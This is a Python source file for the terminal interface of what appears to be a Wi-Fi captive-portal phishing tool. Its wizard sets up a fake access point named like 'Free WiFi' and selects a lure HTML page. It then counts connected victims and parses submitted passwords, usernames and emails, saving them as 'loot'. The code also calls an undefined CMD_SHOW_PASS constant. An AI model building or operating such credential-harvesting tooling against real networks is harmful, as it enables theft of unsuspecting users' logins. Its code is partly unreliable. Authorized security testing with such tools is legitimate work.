"""Portal screen — setup wizard + live monitoring via LogViewer."""

import re
import urwid

from ...app_state import AppState
from ...serial_manager import SerialManager
from ...loot_manager import LootManager
from ...config import CMD_LIST_SD, CMD_SELECT_HTML, CMD_START_PORTAL, CMD_STOP
from ..widgets.log_viewer import LogViewer
from ..widgets.text_input_dialog import TextInputDialog
from ..widgets.file_picker import FilePicker


# Wizard states
STATE_IDLE = 0
STATE_SSID_INPUT = 1
STATE_LOADING_FILES = 2
STATE_FILE_SELECT = 3
STATE_CONFIRM = 4
STATE_RUNNING = 5


class PortalScreen(urwid.WidgetWrap):
    """Multi-step portal setup wizard, then live log monitoring.

    Hotkeys:
    - [s] start setup wizard
    - [Esc/x] stop portal
    - [d] show captured data
    """

    def __init__(self, state: AppState, serial: SerialManager, app,
                 loot: LootManager | None = None) -> None:
        self.state = state
        self.serial = serial
        self._app = app
        self._loot = loot
        self._wizard_state = STATE_IDLE

        self._log = LogViewer()
        self._status = urwid.Text(("dim", "  [s]Setup portal"))
        self._info = urwid.Text(("portal", "  Captive Portal — idle"))

        self._idle_view = urwid.ListBox(urwid.SimpleFocusListWalker([
            urwid.Text(("portal", "  Press [s] to start portal setup wizard")),
        ]))
        self._body = urwid.WidgetPlaceholder(self._idle_view)

        pile = urwid.Pile([
            ("pack", self._info),
            ("pack", urwid.Divider("─")),
            self._body,
            ("pack", urwid.Divider("─")),
            ("pack", self._status),
        ])
        super().__init__(pile)

        # Temp storage for wizard
        self._ssid = ""
        self._html_files: list[dict] = []
        self._fetch_lines: list[str] = []
        self._fetching_files = False

    def refresh(self) -> None:
        if self.state.portal_running:
            self._info.set_text(
                ("success",
                 f"  Portal RUNNING | SSID: {self.state.portal_ssid}"
                 f" | Forms: {self.state.submitted_forms}"
                 f" | Clients: {self.state.portal_client_count}")
            )
            self._status.set_text(("dim", "  [x]Stop  [d]Show data"))
        else:
            self._info.set_text(("portal", "  Captive Portal — idle"))
            self._status.set_text(("dim", "  [s]Setup portal"))

    def handle_serial_line(self, line: str) -> None:
        """Process serial lines when portal tab is active."""
        # Loading HTML file list
        if self._fetching_files:
            self._fetch_lines.append(line)
            if "No HTML" in line or "files found" in line.lower() or len(self._fetch_lines) > 100:
                self._finish_file_load()
            return

        # Portal running — parse events
        if self.state.portal_running:
            self.state.portal_log.append(line)
            self._route_portal_event(line)
            self._log.append(line, self._event_attr(line))

    def _route_portal_event(self, line: str) -> None:
        if "Client connected" in line:
            self.state.portal_client_count += 1
        elif "Client count" in line:
            m = re.search(r"Client count = (\d+)", line)
            if m:
                self.state.portal_client_count = int(m.group(1))
        elif "Password:" in line:
            self.state.submitted_forms += 1
            m = re.search(r"Password:\s*(.+)$", line)
            if m:
                self.state.last_submitted_data = f"Password: {m.group(1)}"
            # Save to loot
            if self._loot:
                self._loot.save_portal_event(line)
        elif any(kw in line.lower() for kw in ("form data:", "username:", "email:")):
            self.state.submitted_forms += 1
            self.state.last_submitted_data = line
            # Save to loot
            if self._loot:
                self._loot.save_portal_event(line)

    @staticmethod
    def _event_attr(line: str) -> str:
        ll = line.lower()
        if "error" in ll or "failed" in ll:
            return "error"
        if "password:" in ll or "form data:" in ll:
            return "success"
        if "client" in ll:
            return "portal"
        return "default"

    # ------------------------------------------------------------------
    # Wizard
    # ------------------------------------------------------------------

    def _start_wizard(self) -> None:
        if self.state.portal_running:
            self._status.set_text(("warning", "  Portal already running — stop first"))
            return
        # Step 1: ask SSID
        def on_ssid(text):
            self._app.dismiss_overlay()
            if text is None:
                self._status.set_text(("dim", "  Setup cancelled"))
                return
            self._ssid = text.strip() or "Free WiFi"
            self.state.portal_ssid = self._ssid
            self._load_html_files()

        dialog = TextInputDialog("SSID name (e.g. Free WiFi)", on_ssid, "Free WiFi")
        self._app.show_overlay(dialog, 50, 8)

    def _load_html_files(self) -> None:
        self._fetching_files = True
        self._fetch_lines = []
        self._status.set_text(("warning", "  Loading HTML files from SD card..."))
        self.serial.send_command(CMD_LIST_SD)

    def _finish_file_load(self) -> None:
        self._fetching_files = False
        self._html_files = []
        for line in self._fetch_lines:
            if re.search(r"^\s*\d+\s+\S+\.html\s*$", line):
                parts = line.strip().split()
                if len(parts) >= 2:
                    self._html_files.append({"number": parts[0], "name": parts[1]})

        if not self._html_files:
            self._status.set_text(("error", "  No HTML files found on SD card"))
            return

        # Show file picker overlay
        names = [f["name"] for f in self._html_files]

        def on_pick(idx, name):
            self._app.dismiss_overlay()
            if idx < 0:
                self._status.set_text(("dim", "  File selection cancelled"))
                return
            file_info = self._html_files[idx]
            self.state.selected_html_name = file_info["name"]
            self.state.selected_html_index = int(file_info["number"])
            # Send select_html command
            self.serial.send_command(f"{CMD_SELECT_HTML} {file_info['number']}")
            self._confirm_start()

        picker = FilePicker(names, on_pick)
        self._app.show_overlay(picker, 50, min(len(names) + 6, 20))

    def _confirm_start(self) -> None:
        from ..widgets.confirm_dialog import ConfirmDialog

        msg = f"Start portal? SSID={self._ssid} HTML={self.state.selected_html_name}"

        def on_confirm(yes):
            self._app.dismiss_overlay()
            if not yes:
                self._status.set_text(("dim", "  Portal start cancelled"))
                return
            self._do_start()

        dialog = ConfirmDialog(msg, on_confirm)
        self._app.show_overlay(dialog, 60, 8)

    def _do_start(self) -> None:
        self.state.reset_portal()
        self.state.portal_ssid = self._ssid
        self.state.portal_running = True
        self._log.clear()
        self.serial.send_command(f"{CMD_START_PORTAL} {self._ssid}")
        self._body.original_widget = self._log
        self._log.append("Portal starting...", "warning")

    def _stop_portal(self) -> None:
        self.serial.send_command(CMD_STOP)
        self.state.portal_running = False
        self._log.append("Portal stopped.", "warning")
        self._status.set_text(("dim", f"  Stopped. Forms: {self.state.submitted_forms}"))

    def keypress(self, size, key):
        if key == "s" and not self.state.portal_running:
            self._start_wizard()
            return None
        if key in ("x", "esc") and self.state.portal_running:
            self._stop_portal()
            return None
        if key == "d":
            self._show_captured()
            return None
        return super().keypress(size, key)

    def _show_captured(self) -> None:
        if not self.state.portal_log:
            self._status.set_text(("dim", "  No captured data yet"))
            return
        self.serial.send_command(CMD_SHOW_PASS)
